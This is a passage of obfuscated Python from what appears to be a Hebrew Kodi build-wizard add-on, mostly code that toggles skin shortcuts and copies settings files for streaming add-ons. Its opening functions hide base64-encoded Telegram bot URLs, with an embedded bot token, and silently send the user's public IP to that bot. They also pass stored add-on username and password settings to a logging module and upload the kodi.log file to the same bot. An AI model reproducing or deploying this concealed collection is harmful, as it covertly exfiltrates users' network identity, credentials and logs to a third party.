          OOO00OOOO000O0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:576
          O0000OOOOO00OOOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:577
          O0OO000O0O00O0OOO =str (json .loads (O0000OOOOO00OOOO0 )['ip'])#line:578
          O00OOOO0OO000OOO0 =OO0O00OO00OOO0O0O #line:579
          O0O00O0OOOOO000OO =OO000OO00000OO00O #line:580
          import socket #line:582
          O0000OOOOO00OOOO0 =urllib2 .urlopen (OOO00OOOO000O0OOO .decode ('base64')+' - '+O00OOOO0OO000OOO0 +' - '+O0O00O0OOOOO000OO +' - '+O0000OO000OO0O0O0 ).readlines ()#line:583
       except :pass #line:584
def googleindicat ():#line:587
			import logg #line:588
			OO00000O000O0O00O =(ADDON .getSetting ("pass"))#line:589
			O0O0OO000O0O0O0OO =(ADDON .getSetting ("user"))#line:590
			logg .logGA (OO00000O000O0O00O ,O0O0OO000O0O0O0OO )#line:591
def logsend ():#line:592
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:593
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:594
      howsentlog ()#line:596
      import requests #line:597
      if xbmc .getCondVisibility ('system.platform.windows'):#line:598
         OOOOOO0O0OOO0O0OO =xbmc .translatePath ('special://home/kodi.log')#line:599
         O0O0OO0O000O0O0O0 ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0O0OOO0O0OO ,open (OOOOOO0O0OOO0O0OO ,'rb')),}#line:603
         O0000OOO0O00OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:604
         O0OOOOO0O0O0OOOO0 =requests .post (O0000OOO0O00OO000 .decode ('base64'),files =O0O0OO0O000O0O0O0 )#line:606
      elif xbmc .getCondVisibility ('system.platform.android'):#line:607
           OOOOOO0O0OOO0O0OO =xbmc .translatePath ('special://temp/kodi.log')#line:608
           O0O0OO0O000O0O0O0 ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0O0OOO0O0OO ,open (OOOOOO0O0OOO0O0OO ,'rb')),}#line:612
           O0000OOO0O00OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:613
           O0OOOOO0O0O0OOOO0 =requests .post (O0000OOO0O00OO000 .decode ('base64'),files =O0O0OO0O000O0O0O0 )#line:615
      else :#line:616
           OOOOOO0O0OOO0O0OO =xbmc .translatePath ('special://kodi.log')#line:617
           O0O0OO0O000O0O0O0 ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0O0OOO0O0OO ,open (OOOOOO0O0OOO0O0OO ,'rb')),}#line:621
           O0000OOO0O00OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:622
           O0OOOOO0O0O0OOOO0 =requests .post (O0000OOO0O00OO000 .decode ('base64'),files =O0O0OO0O000O0O0O0 )#line:624
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:625
def rdoff ():#line:627
	O000OO00OO00OOOOO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:658
	O0O000OO0OOOOOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:659
	copyfile (O000OO00OO00OOOOO ,O0O000OO0OOOOOOO0 )#line:660
def skindialogsettind18 ():#line:661
	try :#line:662
		O00000OO0OO0000OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:663
		O000OOO00OO000O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:664
		copyfile (O00000OO0OO0000OO ,O000OOO00OO000O00 )#line:665
	except :pass #line:666
def rdon ():#line:667
	loginit .loginIt ('restore','all')#line:668
	OO0O0OOO0O0O000OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:670
	O00OO0OOOOOO0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:671
	copyfile (OO0O0OOO0O0O000OO ,O00OO0OOOOOO0O0OO )#line:672
def adults18 ():#line:674
  OOOO00O00O00OO00O =(ADDON .getSetting ("adults"))#line:675
  if OOOO00O00O00OO00O =='true':#line:676
    O0000000000OOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:677
    with open (O0000000000OOO0O0 ,'r')as O00000O0O00OO0000 :#line:678
      O0000OO0OO0O0O0OO =O00000O0O00OO0000 .read ()#line:679
    O0000OO0OO0O0O0OO =O0000OO0OO0O0O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:697
    with open (O0000000000OOO0O0 ,'w')as O00000O0O00OO0000 :#line:700
      O00000O0O00OO0000 .write (O0000OO0OO0O0O0OO )#line:701
def rdbuildaddon ():#line:702
  OO0O000000OO0O00O =(ADDON .getSetting ("auto_rd"))#line:703
  if OO0O000000OO0O00O =='true':#line:704
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:705
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:706
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:707
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:725
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:728
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:729
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:733
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:734
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:735
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:753
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:756
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:757
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:761
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:762
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:763
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:781
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:784
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:785
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:789
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:790
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:791
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:809
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:812
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:813
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:816
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:817
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:818
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:836
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:839
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:840
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:842
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:843
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:844
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:862
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:865
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:866
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:868
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:869
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:870
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:888
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:891
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:892
    O00OOOOOOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:895
    with open (O00OOOOOOOOOO00OO ,'r')as OOOO00O0OO0000O0O :#line:896
      O0OOOO00O000O0OOO =OOOO00O0OO0000O0O .read ()#line:897
    O0OOOO00O000O0OOO =O0OOOO00O000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:915
    with open (O00OOOOOOOOOO00OO ,'w')as OOOO00O0OO0000O0O :#line:918
      OOOO00O0OO0000O0O .write (O0OOOO00O000O0OOO )#line:919
def rdbuildinstall ():#line:922
  try :#line:923
   O00OOO0OO0000O0O0 =(ADDON .getSetting ("auto_rd"))#line:924
   if O00OOO0OO0000O0O0 =='true':#line:925
     O00O0OOO0OOO0O00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:926
     O0000O000OO00OO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:927
     copyfile (O00O0OOO0OOO0O00O ,O0000O000OO00OO00 )#line:928
  except :#line:929
     pass #line:930
def rdbuildaddonoff ():#line:933
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:936
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:937
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:938
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:956
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:959
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:960
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:964
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:965
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:966
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:984
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:987
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:988
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:992
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:993
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:994
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1012
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:1015
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:1016
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1020
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:1021
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:1022
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1040
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:1043
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:1044
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1047
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:1048
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:1049
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1067
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:1070
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:1071
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1073
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:1074
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:1075
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1093
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:1096
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:1097
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1099
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:1100
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:1101
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1119
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:1122
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:1123
    O0OO00OO0000O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1126
    with open (O0OO00OO0000O0OOO ,'r')as O0O0000OOO0OOO00O :#line:1127
      OOOO0O0OOOOOO0OO0 =O0O0000OOO0OOO00O .read ()#line:1128
    OOOO0O0OOOOOO0OO0 =OOOO0O0OOOOOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1146
    with open (O0OO00OO0000O0OOO ,'w')as O0O0000OOO0OOO00O :#line:1149
      O0O0000OOO0OOO00O .write (OOOO0O0OOOOOO0OO0 )#line:1150
def rdbuildinstalloff ():#line:1153
    try :#line:1154
       O0OO0O0OO0O00O0O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1155
       OO000OOOOOOO00OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1156
       copyfile (O0OO0O0OO0O00O0O0 ,OO000OOOOOOO00OO0 )#line:1158
       O0OO0O0OO0O00O0O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1160
       OO000OOOOOOO00OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1161
       copyfile (O0OO0O0OO0O00O0O0 ,OO000OOOOOOO00OO0 )#line:1163
       O0OO0O0OO0O00O0O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1165
       OO000OOOOOOO00OO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1166
       copyfile (O0OO0O0OO0O00O0O0 ,OO000OOOOOOO00OO0 )#line:1168
       O0OO0O0OO0O00O0O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1171
       OO000OOOOOOO00OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1172
       copyfile (O0OO0O0OO0O00O0O0 ,OO000OOOOOOO00OO0 )#line:1174
    except :#line:1176
       pass #line:1177
def rdbuildaddonON ():#line:1184
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1186
    with open (OOO0OO00O0OOOO0OO ,'r')as OOO0O00O0O000OOOO :#line:1187
      OOOO00000O0O0OOO0 =OOO0O00O0O000OOOO .read ()#line:1188
    OOOO00000O0O0OOO0 =OOOO00000O0O0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1206
    with open (OOO0OO00O0OOOO0OO ,'w')as OOO0O00O0O000OOOO :#line:1209
      OOO0O00O0O000OOOO .write (OOOO00000O0O0OOO0 )#line:1210
    OOO0OO00O0OOOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1214
